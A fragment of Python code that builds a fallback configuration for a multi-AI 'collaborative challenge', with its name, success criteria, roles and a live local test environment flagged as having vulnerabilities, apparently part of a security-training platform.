            "name": f"Collaborative Test: {difficulty.title()} Multi-AI Challenge",
            "description": f"Demonstrate effective collaboration between {', '.join(ai_types)} AI types to solve a complex challenge that requires multiple perspectives and capabilities.",
            "objective": "Complete the collaborative challenge successfully while demonstrating effective teamwork and coordination between different AI types.",
            "requirements": ["Effective collaboration", "Task coordination", "Result integration", "Performance optimization"],
            "success_criteria": ["Challenge completed", "Collaboration demonstrated", "Results integrated", "Performance optimized"],
            "ai_roles": self._assign_ai_roles(ai_types, "Fallback Collaborative Challenge"),
            "complexity_score": 7.0,
            "estimated_duration": "3-6 hours",
            "collaborative_test": True,
            "ai_types": ai_types,
            "test_type": "general",
            "difficulty": difficulty,
            "user_id": user_id,
            "scenario_id": f"collaborative_fallback_{'_'.join(ai_types)}_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            "live_environment": {
                "is_live": True,
                "real_vulnerabilities": True,
                "dynamic_content": True,
                "interactive_elements": True,
                "real_time_feedback": True,
                "multi_ai_coordination": True,
                "container_id": f"collaborative_fallback_{'_'.join(ai_types)}_{user_id}_{random.randint(1000, 9999)}",
                "target_url": f"http://localhost:{8080 + random.randint(0, 9)}",
                "port": 8080 + random.randint(0, 9)
            }
        }